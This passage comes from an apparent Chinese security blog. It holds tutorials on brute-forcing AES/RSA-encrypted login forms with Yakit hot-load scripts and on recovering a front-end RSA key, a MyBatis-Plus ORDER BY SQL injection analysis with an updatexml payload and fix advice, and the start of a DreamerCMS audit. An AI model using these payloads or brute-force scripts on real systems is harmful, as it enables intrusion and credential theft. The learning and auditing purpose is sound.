<blockquote>
<p>一个字节是4bit，英文1字节，中文utf-8编码3字节、gbk编码2字节。128比特&#x3D;16字节</p>
</blockquote>
<p>01、NoPadding：</p>
<p>不做任何填充，但是要求明文必须是16字节的整数倍。</p>
<p>02、PKCS7Padding（默认）：</p>
<p>若明文块不足16个字节，在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。</p>
<p>例：{1,2,3,4,5,a,b,c,d,e}，缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6}</p>
<p>03、ISO10126Padding：</p>
<p>若明文块不足16个字节，在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。</p>
<p>比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</p>
<p><strong>模式</strong></p>
<p>AES算法的模式是指在进行分组密码加密时，对数据块的处理方式。常见的AES加密算法的模式包括：ECB、CBC、CFB、OFB等，其中CBC模式被广泛使用。下边我们主要看一下ECB模式与CBC模式</p>
<p>01、ECB</p>
<ul>
<li>电码本模式，是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。</li>
<li>ECB相同的数据块密钥一样的话输出的密文也一样，容易被攻击。</li>
</ul>
<p>02、CBC</p>
<ul>
<li>密码分组链接模式，先将明文切分为块，每一块与上一块的密文块进行异或运算后，再使用密钥进行加密。第一个块需要使用初始化向量（IV），一般来说，每次加密时都会随机产生一个不同的比特序列来作为初始化向量。</li>
<li>递归加密带来的问题是没有办法随机访问各个区块了，访问某个区块必须解出前一个区块数据。</li>
<li>这种方式相对ECB提高了安全性，是常用的工作模式，用于SSL。缺点是加密过程是串行的，无法被并行化</li>
</ul>
<p>除了ECB无须设置初始化向量IV而不安全之外，其它AES工作模式都必须设置向量IV</p>
<h3 id="CBC模式下的加密登录表单"><a href="#CBC模式下的加密登录表单" class="headerlink" title="CBC模式下的加密登录表单"></a>CBC模式下的加密登录表单</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afda5909af1.png"  alt="image-20240123232511397"></p>
<p>首先我们需要做的就是先了解一下其加密的逻辑：</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afdb3480b84.png"  alt="image-20240123232850729"> </p>
<p><strong>01</strong>生成一个初始iv，长度为 16 字节的随机字节数组，不过我们使用固定的也OK</p>
<p><strong>02</strong>生成一个 KEY，默认为 16 位数 1234123412341234</p>
<p><strong>02</strong>加密前的格式为json，例如：<code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;=&quot;123456&quot;&#125;</code></p>
<p><strong>03</strong>签名使用的哈希算法是<code>AES/CBC</code>，输出结果十六进制</p>
<p><strong>热加载模块中编写代码：</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">dncryptAesCbc = <span class="function"><span class="keyword">func</span><span class="params">(p)</span></span> &#123;</span><br><span class="line">    key = codec.DecodeHex(<span class="string">&quot;31323334313233343132333431323334&quot;</span>)~</span><br><span class="line">    iv = codec.DecodeHex(<span class="string">&quot;880b2eaf1d19c0ae5816d3acd382775f&quot;</span>)~</span><br><span class="line">    usernameDict = [<span class="string">&quot;admin&quot;</span>]</span><br><span class="line">    passwordDict = x<span class="string">&quot;&#123;&#123;payload(pass_top25)&#125;&#125;&quot;</span> <span class="comment">// 我们可以使用x前缀字符串来通过fuzztag语法获取pass_top25字典中的值</span></span><br><span class="line">    <span class="comment">// passwordDict = [&quot;admin&quot;, &quot;123456&quot;, &quot;admin123&quot;, &quot;88888888&quot;, &quot;666666&quot;] // 也可以直接使用手写的list</span></span><br><span class="line">    resultList = []</span><br><span class="line">    <span class="keyword">for</span> username in usernameDict &#123;</span><br><span class="line">        <span class="keyword">for</span> password in passwordDict &#123;</span><br><span class="line">            m = &#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">            jsonInput = json.dumps(m)</span><br><span class="line">            result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~</span><br><span class="line">            base64Result = codec.EncodeBase64(result)</span><br><span class="line">            resultList.Append(base64Result)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultList    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afe1b7358e5.png"  alt="image-20240123235637657"></p>
<h3 id="RSA加密AES秘钥"><a href="#RSA加密AES秘钥" class="headerlink" title="RSA加密AES秘钥"></a>RSA加密AES秘钥</h3><blockquote>
<p>选择AES加密数据的原因是因为AES加密速度快，自然是我们的第一选择，但是缺点也明显。因为使用<code>同一个密钥</code>，如果有一方密钥泄露，那么数据也就不安全了。所以我们可以结合RSA互补二者的缺点，用AES来加密数据，使用RSA来加密传递AES密钥。</p>
</blockquote>
<p>下边我们通过<code>前端RSA加密AES密钥，服务器传输</code>靶场具体学习一下，在这个靶场中，我们有几个难题需要解决：</p>
<ul>
<li>RSA的秘钥是通过服务器传输</li>
<li>响应体也加密无法直接判断是否成功</li>
</ul>
<p>当然，万能的yakit针对这几个问题都有对应的解决方案，通过<code>匹配器、数据提取器、Web Fuzzer序列</code>这些功能就可以完美解决！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65afe7b7a0808.png"  alt="image-20240124002214144"></p>
<p>首先第一步，还是分析具体的一个思路，然后在构造热加载代码：</p>
<p>1）通过<code>/crypto/js/rsa/generator</code>接口获取RSA公钥私钥进行处理</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65afe8c3c02fd.png"  alt="image-20240124002642370"> </p>
<p>2）使用AES-GCM加密数据，可以随机16位、初始iv随机12位。</p>
<blockquote>
<p>AES-GCM 是一种常见的对称加密算法，它结合了 AES 和 GCM（Galois&#x2F;Counter Mode）两种算法。其中，AES 用于加密数据，GCM 用于计算认证标签。</p>
</blockquote>
<p>3）RSA-OAEP再对AES的key和iv加密</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65afea8eabb83.png"  alt="image-20240124003421257"> </p>
<p>4）最后输出的是base64编码后的</p>
<p>知道他大概得逻辑后，就可以着手编写代码了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">aesKey = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">iv = <span class="string">&quot;aaaaaaaaaaaa&quot;</span></span><br><span class="line">aesGCM = data =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> codec.EncodeBase64(codec.AESGCMEncryptWithNonceSize12(aesKey, data, iv)~)</span><br><span class="line">&#125;</span><br><span class="line">rsaOAEP_key = (pem) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> codec.EncodeBase64(codec.RSAEncryptWithOAEP(pem, aesKey)~)</span><br><span class="line">&#125;</span><br><span class="line">rsaOAEP_iv = (pem) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> codec.EncodeBase64(codec.RSAEncryptWithOAEP(pem, iv)~)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后还要解决的几个问题。</p>
<p><strong>01、服务器获取公钥</strong></p>
<p>使用数据提取器获取服务器传输的秘钥。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65aff10df2de5.png"  alt="image-20240124010204387"></p>
<p>把提取字段名设置为 <code>publicKey</code>，这样我们在后续的<code>Web Fuzzer序列</code>模块中就可以当做变量使用了！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65aff4cf2e97d.png"  alt="image-20240124011805764"> </p>
<p><strong>02、继承获取来的秘钥</strong></p>
<p>使用<code>Web Fuzzer序列</code>模块，按图中顺序依次进行。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65aff639d81e2.png"  alt="image-20240124012408257"></p>
<p><strong>03、解密响应内容</strong></p>
<p>我们可以看到这块响应的内容也是加密过的，so我们就没有办法直接判断我们的请求是否成功！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65aff806e1e1d.png"  alt="image-20240124013149346"></p>
<p>所以就要解决这个办法，所以我得想法是：</p>
<ul>
<li>第一个请求中也提取出私钥，设置成变量。</li>
<li>第二个请求中提取去加密的响应结果，设置成变量！</li>
<li>新建第三个请求，热加载编写代码解密数据</li>
</ul>
<p>1）提取出私钥</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65affc03b180e.png"  alt="image-20240124014849985"></p>
<p>2）提取响应的加密数据字段</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65affc22ddbe6.png"  alt="image-20240124014921230"></p>
<p>3）vps起一个web服务接受解密数据并响应便于判断</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b0095aba2df.png"  alt="image-20240124024545240"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b0097af0e96.png"  alt="image-20240124024617465"> </p>
<p>添加个一个匹配器</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b00b6142453.png"  alt="image-20240124025423649"></p>
<p>4）热加载中编写rsa、aes解密代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">oaepDec = (pem,data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(codec.RSADecryptWithOAEP(pem, codec.DecodeBase64(data)~)~)</span><br><span class="line">&#125;</span><br><span class="line">dec = (key,data,iv) =&gt; &#123;</span><br><span class="line">    dump(key, data, iv)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(codec.AESGCMDecryptWithNonceSize12(key, codec.DecodeBase64(data)~, iv)~)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b00a58ec482.png"  alt="image-20240124024959480"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//解密后的iv</span><br><span class="line">&#123;&#123;yak(oaepDec|&#123;&#123;p(privateKey)&#125;&#125;|&#123;&#123;p(encryptedIV)&#125;&#125;)&#125;&#125;</span><br><span class="line">//解密后的key</span><br><span class="line">&#123;&#123;yak(oaepDec|&#123;&#123;p(privateKey)&#125;&#125;|&#123;&#123;p(encryptedKey)&#125;&#125;)&#125;&#125;</span><br><span class="line">//解密后的data</span><br><span class="line">&#123;&#123;yak(dec|&#123;&#123;yak(oaepDec|&#123;&#123;p(privateKey)&#125;&#125;|&#123;&#123;p(encryptedKey)&#125;&#125;)&#125;&#125;|&#123;&#123;p(data)&#125;&#125;|&#123;&#123;yak(oaepDec|&#123;&#123;p(privateKey)&#125;&#125;|&#123;&#123;p(encryptedIV)&#125;&#125;)&#125;&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>04、插入字段爆破</strong></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b00ddd72681.png"  alt="image-20240124030459764"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b00e1474fcf.png"  alt="image-20240124030554719"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b00e36dc60f.png"  alt="image-20240124030629279"> </p>
<h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a>0X03 总结</h2><p>本文中出现的加密算法只是个例，实际应用中可能会有更多种类的算法和接口。但是，本文提供的靶场案例可以帮助大家掌握基本的加密和解密流程。只要能熟练的掌握这些内容，以后碰到别的场景咱只要稍微拓展一下，那也是手拿把掐！</p>
<h2 id="0X04-参考"><a href="#0X04-参考" class="headerlink" title="0X04 参考"></a>0X04 参考</h2><p><a class="link"   href="https://mp.weixin.qq.com/s/ni3sVp0Gh-CwyMPuwk__Cw" >https://mp.weixin.qq.com/s/ni3sVp0Gh-CwyMPuwk__Cw<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/gMbbEV62XR5_QCACQwZnOw" >https://mp.weixin.qq.com/s/gMbbEV62XR5_QCACQwZnOw<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://zhongce.sina.com.cn/article/view/158689" >https://zhongce.sina.com.cn/article/view/158689<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0X05-原文地址"><a href="#0X05-原文地址" class="headerlink" title="0X05 原文地址"></a>0X05 原文地址</h2><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   href="https://mp.weixin.qq.com/s/x-A-ZWqE8C-HN6k9Y2QBbw" >https://mp.weixin.qq.com/s/x-A-ZWqE8C-HN6k9Y2QBbw<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次前端RSA加密实战</title>
    <url>/blog/2024/01/25/240125%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFRSA%E5%8A%A0%E5%AF%86%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>1、开局一个登录框</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b05d05d5249.png"  alt="image-20240124084244114"> </p>
<p>2、看看历史的数据包，可以看到对密码进行了加密处理，并且携带了一个uuid参数。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b05e1453f19.png"  alt="image-20240124084714723"></p>
<p>3、经过测试，uuid随验证码刷新更新，通过<code>/prod-api/captchaImage</code>接口获取，咱主要看rsa加密部分，所以这个先不管</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/24/65b05faf35489.png"  alt="image-20240124085405848"></p>
<p>4、咱就先搜索password关键字</p>
<p>在找的过程中发现看到挺多<code>loginForm.password</code>这样的数据</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b14d0505005.png"  alt="image-20240125014643035"> </p>
<p>想到了Vue中，实现双向数据绑定，存储表单数据形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">   return &#123;</span><br><span class="line">      loginForm: &#123;</span><br><span class="line">        username: &quot;&quot;,</span><br><span class="line">        password: &quot;&quot;,</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就搜索关键字，<code>loginForm.password</code>，因为和他相关的就5处，很容易找到了这个函数g</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b14abdc4830.png"  alt="image-20240125013659824"></p>
<p>5、那就下个断点调试一下</p>
<p>果然不出意外，这个函数g就是对password这字段加密的函数</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b13f80ad226.png"  alt="image-20240125004902458"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b13f98a8991.png"  alt="image-20240125004926903"> </p>
<p>6、在调试一下，找一下g这个函数，就看到了这块！</p>
<p>大胆的猜测一下，d是公钥、m是私钥。然后g是加密的函数、f是解密的函数。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b140029f264.png"  alt="image-20240125005112884"> </p>
<p>7、既然拿到了公钥，直接去怼，看看能不能成功！在这之前，注意到一个问题，这公钥看着怪怪滴。</p>
<p>​	猜测加密前应该有对公钥进行过一些处理，因为函数g里边有个setPublicKey()方法，咱先不跟进去看。全局搜索一下PublicKey关键字看看。</p>
<p>​	接着看到了一个长得像处理公钥的函数。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b1417008269.png"  alt="image-20240125005718095"></p>
<p>8、拿出咱得js调试工具，copy代码。干</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b142a5cd192.png"  alt="image-20240125010227808"> </p>
<p>9、这下看着正常多了，一个标准的PEM格式。直接用YakRuning模块进行RSA加密。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b146da8ef45.png"  alt="image-20240125012024580"> </p>
<p>10、因为之前推测有个函数f是用来解密的。</p>
<p>经过测试，咱们加密过的数据可以被解密，结束！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/25/65b14724b7264.png"  alt="image-20240125012138931"> </p>
]]></content>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title>MybatisPuls分页插件中的SQL注入</title>
    <url>/blog/2024/01/28/240128mybtispubls%E6%8F%92%E4%BB%B6sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近在代码审计案例复现中遇到一个sql注入漏洞感觉比较有意思，拿出来和大家一块分享一下。</p>
<p>在奇安信攻防社区看到的<strong>en0th</strong>师傅的文章<a class="link"   href="https://forum.butian.net/share/2465%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%8F%90%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E5%88%86%E9%A1%B5%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E3%80%82" >https://forum.butian.net/share/2465，其中提到了一个分页插件导致的sql注入漏洞。<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>tkswifty</strong> 师傅也对这个漏洞有了一个详细的解释<a class="link"   href="https://www.sec-in.com/article/1088" >https://www.sec-in.com/article/1088<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x02-案例"><a href="#0x02-案例" class="headerlink" title="0x02 案例"></a>0x02 案例</h2><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5dad9ae68e.png"  alt="image-20240128124056161"></p>
<p>预编译的sql语句：</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39832165.png"  alt="image-20240128124507371"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT id, name, create_by, create_time, update_by, update_time, delete_flag FROM li_goods_unit ORDER BY updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) DESC LIMIT ?</span><br></pre></td></tr></table></figure>

<p>全局搜索<code>PageUtil.initPage</code>只要使用到这个插件，都有可能存在说sql注入。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f398ef3d3.png"  alt="image-20240128132116395"></p>
<h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>1）全局搜索<code>/manager/goods/goodsUnit</code>定位到漏洞路由处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f399896bf.png"  alt="image-20240128124754613"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39a1aae9.png"  alt="image-20240128124855373"></p>
<p>这里接受了<code>pageNumber</code>、<code>pageSize</code>、<code>sort</code>、<code>order</code>这几个参数（漏洞就发生在<code>sort</code>参数）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39aa5b44.png"  alt="image-20240128124927403"></p>
<p>2）可以看到这块使用了<code>PageUtil</code>这个分页插件，我们跟进去。</p>
<p>漏洞原因：其中的<code>initPage</code>函数处理中使用了<code>addOrder</code>但是没有对<code>sort</code>进行SQL语句过滤。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Page&lt;T&gt; <span class="title function_">initPage</span><span class="params">(PageVO page)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Page&lt;T&gt; p;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pageNumber</span> <span class="operator">=</span> page.getPageNumber();</span><br><span class="line">        <span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> page.getPageSize();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sort</span> <span class="operator">=</span> page.getSort();</span><br><span class="line">        <span class="type">String</span> <span class="variable">order</span> <span class="operator">=</span> page.getOrder();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pageNumber &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            pageNumber = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pageSize &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            pageSize = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pageSize &gt; <span class="number">100</span>) &#123;</span><br><span class="line">            pageSize = <span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isNotBlank(sort)) &#123;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">isAsc</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (StrUtil.isBlank(order)) &#123;</span><br><span class="line">                isAsc = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;desc&quot;</span>.equals(order.toLowerCase())) &#123;</span><br><span class="line">                    isAsc = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;asc&quot;</span>.equals(order.toLowerCase())) &#123;</span><br><span class="line">                    isAsc = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(pageNumber, pageSize);</span><br><span class="line">            <span class="keyword">if</span> (isAsc) &#123;</span><br><span class="line">                p.addOrder(OrderItem.asc(sort));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p.addOrder(OrderItem.desc(sort));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(pageNumber, pageSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39b33bcc.png"  alt="image-20240128125541306"></p>
<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="PaginationInnerInterceptor插件"><a href="#PaginationInnerInterceptor插件" class="headerlink" title="PaginationInnerInterceptor插件"></a>PaginationInnerInterceptor插件</h3><p>PaginationInnerInterceptor作为plus的分页插件，提供了通用的参数进行统一配置。可以很方便的完成分页的业务逻辑。</p>
<p>具体的分页是通过配置Page对象相关的参数实现的。<code>com.baomidou.mybatisplus.extension.plugins.pagination.page</code></p>
<p>因为Orderby动态查询没办法进行预编译，所以不经过安全检查的话会存在注入风险。PaginationInnerInterceptor主要是通过设置<code>com.baomidou.mybatisplus.extension.plugins.pagination.page</code>对象里的属性来实现orderby的，主要是以下函数的调用，因为Orderby动态查询没办法进行预编译，so一下函数直接使用的是<code>sql拼接</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">page.setAsc();</span><br><span class="line">page.setDesc();</span><br><span class="line">page.setAscs();</span><br><span class="line">page.setDescs();</span><br><span class="line">page.setOrders();</span><br><span class="line">page.addOrder();</span><br></pre></td></tr></table></figure>

<h3 id="Spring自动绑定"><a href="#Spring自动绑定" class="headerlink" title="Spring自动绑定"></a>Spring自动绑定</h3><p>在 Spring框架中，提交请求的数据是通过方法形参来接收的。从客户端请求的 key&#x2F;value 数据，经过参数绑定，将 key&#x2F;value 数据绑定到 Controller 的形参上，然后在 Controller 就可以直接使用该形参。</p>
<p>例如：</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39b9f663.png"  alt="image-20240128130904547"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39c10aeb.png"  alt="image-20240128130933834"></p>
<p>查看Page的属性，是直接通过sort参数就可以完成对应的分页排序需求</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39c7ffea.png"  alt="image-20240128131245576"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/28/65b5f39cebaee.png"  alt="image-20240128131220109"></p>
<p>根据spring自动绑定的特性，若此时加入orders参数的传递，同样的后端会进行对应的实体封装，最终带入到sql查询中，同时因为<strong>order by场景下MybatisPlus并没有相关的安全措施</strong> ，会导致SQL注入风险。</p>
<p>案例中中的<code>initPage</code>函数处理中使用了<code>addOrder</code>但是没有对<code>sort</code>进行SQL语句过滤，导致存在SQL注入。</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1）在使用Page对象前对参数进行<code>安全检查</code></p>
<p>2）全局过滤器，在参数传递到Controller 前进行<code>安全检查</code></p>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a class="link"   href="https://forum.butian.net/share/2465" >https://forum.butian.net/share/2465<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.sec-in.com/article/1088" >https://www.sec-in.com/article/1088<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0X07-原文地址"><a href="#0X07-原文地址" class="headerlink" title="0X07 原文地址"></a>0X07 原文地址</h2><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   href="https://mp.weixin.qq.com/s/jHqPwfvKWX3QN5CHJcfJiQ" >https://mp.weixin.qq.com/s/jHqPwfvKWX3QN5CHJcfJiQ<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
  <entry>
    <title>DreamerCMS_4.0.1代码审计</title>
    <url>/blog/2024/02/01/240201DreamerCMS_4.0.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>全局搜索${</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/21/65d5f763be61e.png"  alt="image-20240201230613493"></p>
<p>定位到这块<code>dreamer_cms_4.0.1\src\main\resources\mapping\ArchivesMapper.xml</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbad014b358.png"  alt="image-20240201223856519"></p>
<p>向上跟进找到接口调用处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbadcc5d4d8.png"  alt="image-20240201224219640"></p>
<p>继续向上寻找，发现有两处调用<code>queryListByKeywords</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd39c1b1a6e.png"  alt="image-20240203025144262"></p>
<h3 id="后台首页搜索处存在SQL注入"><a href="#后台首页搜索处存在SQL注入" class="headerlink" title="后台首页搜索处存在SQL注入"></a>后台首页搜索处存在SQL注入</h3><p>我们分析，先定位到第一处<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\service\impl\ArchivesServiceImpl.java</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbadec26fb0.png"  alt="image-20240201224251265"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbae28c7b4a.png"  alt="image-20240201224351906"></p>
<p>在向上寻找<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\admin\SearchController.java</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbae75835a7.png"  alt="image-20240201224509010"></p>
<p>该功能点在首页搜索处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbaf5c0de2e.png"  alt="image-20240201224859444"></p>
<p>抓包并把keyword参数改为<code>typeid</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbaf945bc68.png"  alt="image-20240201224955881"></p>
